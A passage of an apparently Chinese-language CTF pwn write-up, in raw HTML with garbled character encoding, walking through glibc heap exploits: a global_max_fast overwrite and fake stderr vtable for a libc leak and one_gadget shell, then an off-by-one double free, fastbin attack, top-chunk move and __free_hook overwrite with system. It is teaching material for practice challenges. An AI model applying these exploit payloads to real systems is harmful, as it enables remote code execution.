<span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">0x77f8</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre><p>è¿™é‡Œé¢çš„<code>0x77f8</code>æ˜¯global_max_faståœ°å€çš„æœ€åå››ä½ï¼Œè™½ç„¶å¼€å¯äº†PIEï¼Œä½†åœ°å€çš„æœ€åä¸‰ä½æ˜¯ä¸å˜çš„ï¼Œæˆ‘ä»¬åªéœ€è¦çˆ†ç ´å€’æ•°ç¬¬å››ä½å³å¯ï¼Œä¹Ÿå°±æ˜¯åå…­åˆ†ä¹‹ä¸€çš„å‡ ç‡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨gdbä¸­çœ‹çœ‹<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/22.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/23.jpg" alt=""><br>global_max_fastä¸main_arenaçš„åœ°å€ç›¸æ¯”ç¡®å®åªæœ‰æœ€åå››ä½ä¸ä¸€æ ·ï¼Œå¹¶ä¸”æœ€åä¸‰ä½å›ºå®šä¸º<code>7f8</code><br>è€Œ<code>0x1229</code>åˆ™æ˜¯global_max_fastçš„åœ°å€ä¸stdoutä¸Šå¯ä»¥æ„é€ fakechunkçš„åœ°å€çš„ç›¸å¯¹ä¾¿å®œ<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/24.jpg" alt=""></p><pre class=" language-python"><code class="language-python">malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'\x22'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre><p>ä¸¤æ¬¡mallocä¹‹åï¼Œglobal_max_fastçš„å€¼å˜æˆäº†main_arena+88çš„åœ°å€(åå…­åˆ†ä¹‹ä¸€çš„å‡ ç‡)<br>æ¥ç€å†å°†å †å—æ¢å¤</p><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'\x22'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre><p>ç„¶åå¼€å§‹å‡†å¤‡ä¿®æ”¹IO_FILEï¼Œæ³„éœ²libcåœ°å€</p><pre class=" language-python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'\x22'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p16<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre><p>æ­¤æ—¶çš„å †ç»“æ„å¦‚ä¸‹<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/25.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/26.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/27.jpg" alt=""></p><pre class=" language-python"><code class="language-python">malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">)</span>py <span class="token operator">=</span> <span class="token string">''</span>py <span class="token operator">+=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x41</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token string">'\x00'</span> <span class="token operator">+</span> <span class="token string">'\n'</span> edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>py<span class="token punctuation">)</span></code></pre><p>ç¬¬ä¸€æ¬¡mallocä¹‹å<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/28.jpg" alt=""><br>æ¥ä¸‹æ¥å†mallocä¸€æ¬¡å°±èƒ½å°†chunkåˆ†é…åˆ°stdout-0x51å¤„<br>ç„¶åä¿®æ”¹IO_FILEçš„å€¼ï¼Œå°±èƒ½æ³„éœ²å‡ºlibcåœ°å€äº†<br>å‰©ä¸‹çš„ä¹Ÿå°±æ¯”è¾ƒå®¹æ˜“äº†ï¼Œå†æ¬¡ä¿®æ”¹IO_FILE</p><blockquote><p>ç„¶åä¼ªé€ stderrçš„vtableï¼Œç”±äºç¨‹åºæŠ¥é”™ä¼šæ‰§è¡Œvtable+0x18å¤„çš„IO_file_overflowå‡½æ•°ï¼Œæ‰€ä»¥å°†è¿™ä¸ªIO_file_overflowå‡½æ•°æ”¹æˆonegadget</p></blockquote><p>é™„ä¸Švtableå­˜å‚¨çš„å‡½æ•°è·³è½¬æŒ‡é’ˆ</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span> funcs<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>   <span class="token number">1</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// "extra word"</span>   <span class="token number">2</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// DUMMY</span>   <span class="token number">3</span> exit<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// finish</span>   <span class="token number">4</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// overflow</span>   <span class="token number">5</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// underflow</span>   <span class="token number">6</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// uflow</span>   <span class="token number">7</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// pbackfail</span>   <span class="token number">8</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// xsputn  #printf</span>   <span class="token number">9</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// xsgetn</span>   <span class="token number">10</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// seekoff</span>   <span class="token number">11</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// seekpos</span>   <span class="token number">12</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// setbuf</span>   <span class="token number">13</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// sync</span>   <span class="token number">14</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// doallocate</span>   <span class="token number">15</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// read</span>   <span class="token number">16</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// write</span>   <span class="token number">17</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// seek</span>   <span class="token number">18</span> pwn<span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">// close</span>   <span class="token number">19</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// stat</span>   <span class="token number">20</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// showmanyc</span>   <span class="token number">21</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// imbue</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><pre class=" language-python"><code class="language-python">rc<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>rc<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3c5600</span>onegadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xf1147</span><span class="token keyword">print</span> <span class="token string">"libc_base--->"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>fake_vtable <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3c5600</span><span class="token operator">-</span><span class="token number">8</span> binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>py <span class="token operator">=</span> <span class="token string">'\x00'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x3c55e0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_vtable<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>py<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># trigger abort-->flush</span>malloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span></code></pre><p>çœ‹ä¸€çœ‹editåçš„æ•ˆæœ<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/29.jpg" alt=""><br>è¿™æ ·çœ‹ä¸å¤ªæ¸…æ¥šï¼Œæˆ‘ä»¬ä»¥8å­—èŠ‚å¯¹é½æ¥çœ‹<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/30.jpg" alt=""><br>å†çœ‹ä¸€ä¸‹stderrçš„vtableçš„æŒ‡é’ˆ<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/31.jpg" alt=""><br>ç¡®å®è¢«ä¿®æ”¹äº†(è¿™ç§æ”»å‡»æ–¹å¼åªå¯¹libc2.24ä»¥ä¸‹æœ‰æ•ˆï¼Œ2.24åŠä»¥ä¸Šå°±æœ‰äº†é˜²å¾¡æ‰‹æ®µäº†ï¼Œä¸è¿‡ä¸€æ ·æœ‰æ–¹æ³•æ”»å‡»)<br>one_gadgetçš„åœ°å€è¢«æ”¾åœ¨äº†vtable+0x18çš„ä½ç½®å¤„ï¼Œåªéœ€è¦ä½¿å…¶æŠ¥é”™å³å¯getshell</p><h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><p>è€ƒå¯Ÿç‚¹ï¼šoff-by-one free_hook<br>ç¨‹åºä¿æŠ¤å…¨å¼€ï¼Œæœ‰å¢åˆ æŸ¥ä¸‰ä¸ªåŠŸèƒ½<br>mainå‡½æ•°ä¸­æœ‰ä¸€ä¸ªsub_BD8å‡½æ•°</p><pre class=" language-c"><code class="language-c">v0 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>qword_202040 <span class="token operator">=</span> _malloc_hook<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v0<span class="token punctuation">;</span></code></pre><p>å°†__malloc_hookèµ‹ç»™äº†qword_202040<br>è¿˜æœ‰ä¸€ä¸ªsub_AFAå‡½æ•°</p><pre class=" language-c"><code class="language-c">v1 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>dword_202048 <span class="token punctuation">)</span>  <span class="token function">_assert_fail</span><span class="token punctuation">(</span><span class="token string">"replaced"</span><span class="token punctuation">,</span> <span class="token string">"fastbin.c"</span><span class="token punctuation">,</span> <span class="token number">0x26u</span><span class="token punctuation">,</span> <span class="token string">"restore_hook"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>dword_202048 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>_malloc_hook <span class="token operator">=</span> qword_202040<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v1<span class="token punctuation">;</span></code></pre><p>å°±æ˜¯è¯´malloc_hookçš„å€¼åœ¨æ¯æ¬¡addä¹‹åéƒ½ä¼šè¢«ä¿®æ”¹ï¼Œè¿™æ ·æˆ‘ä»¬å°±æ— æ³•åˆ©ç”¨__malloc_hookäº†</p><p>å†çœ‹åˆ°addå‡½æ•°<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/32.jpg" alt=""><br>å­˜åœ¨off-by-oneæ¼æ´</p><p>ç„¶åæ˜¯deleteå‡½æ•°<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/33.jpg" alt=""><br>freeä¸”æ¸…é›¶ï¼Œæ— æ¼æ´</p><p>æœ€åæ˜¯showå‡½æ•°<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/34.jpg" alt=""><br>è¾“å‡ºæ‰€æœ‰chunkçš„å†…å®¹</p><p>æ•´ç†ä¸€ä¸‹æ”»å‡»æ€è·¯ï¼šæ— æ³•ä¿®æ”¹gotè¡¨ï¼Œæ— æ³•åˆ©ç”¨malloc_hookï¼Œå‰©ä¸‹çš„å¯ä»¥åˆ©ç”¨å’Œfree_hookå’ŒIO_FILEï¼Œä¸ªäººå€¾å‘äºä½¿ç”¨free_hook<del>(IO_FILEä½¿ç”¨ä¸ç†Ÿç»ƒ,tcl)</del><br>é‚£ä¹ˆå…ˆæ¥æ³„éœ²libcåœ°å€<br>è¿™é¢˜çš„æ³„éœ²æ–¹æ³•å¾ˆç®€å•ï¼Œaddä¸€ä¸ªunsorted binå¤§å°çš„chunkï¼Œç„¶åfreeï¼Œæ¥ç€addç›¸åŒå¤§å°çš„chunkï¼Œæ¥ç€è¾“å‡ºå³å¯</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 1</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">'leak_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> leak_addr<span class="token number">-0x3c4b78</span>success<span class="token punctuation">(</span><span class="token string">'libc_base:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>__malloc_hook_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">'__malloc_hook_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>__malloc_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>__free_hook_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">'__free_hook_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>__free_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">'system_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>å¦å¤–ï¼Œoff-by-oneå¯ä»¥æ„é€ å‡ºdoublefreeï¼Œæ„é€ æ–¹æ³•å¦‚ä¸‹</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 3</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 4</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xe1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># delete 2 and 3</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 5</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># free chunk3</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># double free chunk3</span></code></pre><p><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/35.jpg" alt=""><br>æ„é€ å‡ºäº†double free<br>æ¥ä¸‹æ¥å°±æ˜¯æƒ³åŠæ³•æŠŠchunkåˆ†é…åˆ°free_hookä¸Šæ–¹ï¼Œç„¶åå°†systemå‡½æ•°çš„åœ°å€å†™å…¥å…¶ä¸­ï¼Œæœ€åfreeä¸€ä¸ªå†…å®¹æ˜¯/bin/shçš„chunkå³å¯getshell<br>ç”±äºfree_hookçš„ä¸Šæ–¹éƒ½æ˜¯0ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•åˆ©ç”¨fastbinattack<br>äºæ˜¯æˆ‘ä»¬æŠŠtopchunkçš„åœ°å€æŒªä¸€æŒªï¼Œä½¿å…¶æŒªåˆ°ä¸€ä¸ªæˆ‘ä»¬ç»è¿‡ä¸€å®šæ¬¡æ•°åˆ†é…åèƒ½å°†chunkåˆ†é…åˆ°free_hookçš„åœ°æ–¹<br>é¦–å…ˆè®©æˆ‘ä»¬åº·åº·<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/37.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/38.jpg" alt=""><br>topchunkçš„åœ°å€æ­£æ˜¯å­˜åœ¨main_arena+88å¤„ï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³åŠæ³•ä¿®æ”¹main_arena+88çš„å€¼å³å¯ï¼Œé‚£æˆ‘ä»¬è¯¥å¦‚ä½•ä¿®æ”¹ä¿®æ”¹<br>å¯ä»¥åœ¨main_arenaé™„è¿‘ä½¿ç”¨fastbin attack<br>æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°åœ¨__malloc_hook-0x3å¤„å­˜åœ¨ä¸€ä¸ªå¤§å°åˆé€‚çš„chunk<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/36.jpg" alt=""><br>è€Œmalloc_hookåˆæ˜¯ç´§é‚»main_arenaçš„ï¼Œæ‰€ä»¥å¯ä»¥ä»è¿™é‡Œå¼€å§‹<br>æˆ‘ä»¬å…ˆåˆ©ç”¨double freeå°†chunkåˆ†é…åˆ°malloc_hook-0x3å¤„</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__malloc_hook_addr<span class="token number">-0x3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># heap 3</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># heap 4</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'cccc'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># heap 5</span></code></pre><p>æ¥ä¸‹æ¥è¿˜è¦æƒ³åŠæ³•æ›´é è¿‘ä¸€ç‚¹ï¼Œé‚£å°±ç»§ç»­fastbin attackï¼Œæˆ‘ä»¬åªéœ€è¦ä¼ªé€ fakechunkå³å¯</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> chr<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x1b</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__malloc_hook_addr<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>åº·åº·è¿™æ ·æ„é€ ä¹‹åä¼šå˜æˆä»€ä¹ˆæ ·<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/39.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/40.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/41.jpg" alt=""><br>main_arena+48å¯¹åº”ç€çš„æ˜¯fastbinä¸­0x70å¤§å°çš„chunkçš„åœ°å€ï¼Œè¿™æ ·æˆ‘ä»¬å†addä¸€ä¸ªå°±èƒ½å°†chunkåˆ†é…åˆ°main_arena+16å¤„<br>ç„¶åå°±æ˜¯å°†topchunkçš„åœ°å€ç»™è¦†ç›–æ‰ï¼Œè¦†ç›–åˆ°å“ªï¼Œ__free_hook-0xb58å¤„æ˜¯ä¸€ä¸ªå¯ä»¥æ¥å—çš„åœ°å€ï¼Œä½œä¸ºtopchunkå¤§å°ä¹Ÿè¶³å¤Ÿ<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/42.jpg" alt=""></p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> chr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__free_hook_addr<span class="token number">-0xb58</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/43.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/44.jpg" alt=""><br>è¦†ç›–æˆåŠŸ<br>æœ€åå°±æ˜¯è¿ç»­åˆ†é…äº†ï¼Œè€ƒè™‘åˆ°0xb85/0xa0=18â€¦0x18,æˆ‘ä»¬è¿ç»­åˆ†é…18ä¸ª0x90å¤§å°çš„chunkï¼Œç¬¬åä¹æ¬¡åˆ†é…å°±èƒ½åˆ†é…åˆ°free_hooké™„è¿‘ï¼Œç„¶åå°±èƒ½ä¿®æ”¹free_hookçš„å€¼</p><pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span></code></pre><p>ä»¥ä¸‹æ˜¯å®Œæ•´exp</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token 